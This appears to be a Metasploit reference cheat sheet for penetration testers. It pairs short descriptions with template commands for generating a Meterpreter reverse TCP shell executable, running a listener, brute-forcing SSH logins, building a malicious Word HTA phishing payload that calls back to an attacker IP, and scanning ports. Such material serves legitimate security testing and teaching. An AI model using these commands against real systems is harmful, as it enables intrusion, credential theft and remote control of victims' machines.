#### Metasploit

Metasploit is an open-source penetration testing framework that provides a platform for developing, testing, and executing exploit code against a remote target


# Set up a reverse TCP shell on a Windows MS-SQL server

# In MSFVenom, create a payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} -f exe -o payload.exe

# In MSF6, use Metasploit
use exploit/multi/handler
set payload /windows/meterpreter/reverse_tcp
setg LHOST {ip}
run

# Exploiting Known Vulnerabilities
Metasploit can be used to exploit known vulnerabilities in target systems. For example, if a target system is known to be vulnerable to a specific exploit, security professionals can use the corresponding Metasploit module to assess and demonstrate the impact.

msfconsole
use exploit/<exploit_module>
set RHOSTS <target_ip>
exploit

# Password Attacks
Metasploit includes modules for password attacks, such as brute-force attacks and credential spraying. These modules can be used to test the strength of passwords on target systems.

msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target_ip>
set USER_FILE <user_list>
set PASS_FILE <password_list>
run

# Phishing Campaigns
Metasploit can be used to simulate phishing attacks by creating malicious payloads embedded in emails or websites. This helps organizations assess their susceptibility to social engineering.

msfconsole
use exploit/windows/fileformat/office_word_hta
set PAYLOAD <payload_type>
set LHOST <attacker_ip>
exploit

# Post-Exploitation Activities
After successfully compromising a target, Metasploit's Meterpreter payload can be used for various post-exploitation activities, including file manipulation, privilege escalation, and lateral movement.

msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
exploit

# Network Scanning and Enumeration
Metasploit includes modules for network scanning and enumeration, allowing security professionals to gather information about target networks and systems.

msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip_range>
run

# Payload Generation
Metasploit can generate custom payloads for various platforms and scenarios. This is useful for creating specific executable files or scripts tailored to the target environment.

msfvenom -p <payload_type> LHOST=<attacker_ip> LPORT=<attacker_port> -f <output_format> > output_file

